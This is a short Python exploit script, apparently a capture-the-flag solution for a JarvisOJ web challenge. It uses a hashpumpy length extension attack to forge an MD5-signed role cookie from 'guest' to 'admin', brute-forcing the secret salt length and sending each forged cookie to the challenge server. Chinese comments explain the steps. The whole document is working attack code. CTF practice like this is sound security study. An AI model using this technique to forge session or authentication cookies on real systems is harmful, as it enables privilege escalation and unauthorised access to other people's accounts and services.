import requests,hashpumpy,urllib


def attack():
    url = 'http://web.jarvisoj.com:32778/'

    old_cookie = '3a4727d57463f122833d9e732f94e4e0'
    str1 = 's:5:"guest";'
    str2 = 's:5:"admin";'
    str1 = str1[::-1]                           #倒过来,这道题要role的值反过来求md5
    str2 = str2[::-1]

    for i in range(1,20):                       #用于爆破salt的长度
        new_cookie,message = hashpumpy.hashpump(old_cookie,str1,str2,i)
        payload = {'role':urllib.parse.quote(message[::-1]),'hsh':new_cookie}           #quote()可以把 \x00 变成 %00
        ans = requests.get(url,cookies = payload)
        print(i)
        print(ans.text)
        if 'welcome' in ans.text:
            print(ans.text)

#print(urllib.parse.quote('\x00'))
attack()